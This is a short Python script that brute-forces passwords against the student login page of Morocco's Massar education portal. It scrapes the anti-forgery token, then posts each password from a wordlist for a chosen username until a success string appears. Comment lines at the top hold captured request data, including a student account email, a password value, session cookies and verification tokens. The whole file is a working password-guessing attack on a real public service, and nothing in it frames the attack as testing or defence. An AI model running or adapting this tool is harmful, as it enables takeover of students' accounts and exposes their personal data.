# #__RequestVerificationToken=Tif0DCpUNRxtUrR_nSppxlnD_52Y2j6OcL6n9kpNK2mlV_ZaSO1ACzbSBDvcdZQUo2sg3q1V1_fxZfKtgdZaEHHiUmQ1&UserName=L148086957%40taalim.ma&Password=csdsadas
# #_ga=GA1.3.1272372406.1673734520; __RequestVerificationToken_L21vdXRhbWFkcmlz0=U_H754mvtliz2oRVYhLyIFNvJ_XU7MGwUpsKy7Zo30pJMkj-rqNzNOH_TdMW5G0nAYwwZB95XAuMwoHiBQj5HnM1PEo1; _gid=GA1.3.909540211.1680143367; ASP.NET_SessionId=; _gat=1
# #_ga=GA1.3.1272372406.1673734520; __RequestVerificationToken_L21vdXRhbWFkcmlz0=U_H754mvtliz2oRVYhLyIFNvJ_XU7MGwUpsKy7Zo30pJMkj-rqNzNOH_TdMW5G0nAYwwZB95XAuMwoHiBQj5HnM1PEo1; _gid=GA1.3.909540211.1680143367; ASP.NET_SessionId=nstazaw12wgjqx0wzq0emrnp; _gat=1
# #U_H754mvtliz2oRVYhLyIFNvJ_XU7MGwUpsKy7Zo30pJMkj-rqNzNOH_TdMW5G0nAYwwZB95XAuMwoHiBQj5HnM1PEo1
import requests
from bs4 import BeautifulSoup
import argparse
import sys
import os
if __name__ == "__main__":
    s = requests.Session()
    url = 'https://massarservice.men.gov.ma/moutamadris/Account'
    g = s.get(url)
    token = BeautifulSoup(g.text, 'html.parser').find('input',{'type':'hidden'})['value']
parser = argparse.ArgumentParser()
parser.add_argument('--user', dest='user', type=str)
parser.add_argument('--wordlist', dest='wordlist', type=str)
args = parser.parse_args()
if args.user is not None and args.wordlist is not None:
    file1 = open(args.wordlist, 'r')
    Lines = file1.readlines()
    for i in Lines:
        password = i.strip()
        params = {
            "__RequestVerificationToken":token,
            "UserName":args.user,
            "Password":password
        }
        OKGREEN = '\033[92m'
        p = s.post(url,data=params)
        if "أستعد لإختبار السلامة الطرقية" in p.text:
            print('{}the credetials is correct !! {}:{}{}'.format(OKGREEN,args.user,password,'\033[0m'))
            break
        else:
            print('the credetials is incorrect !! {}:{}'.format(args.user,password))
    
else:
    os.system('python {}'.format(sys.argv[0]))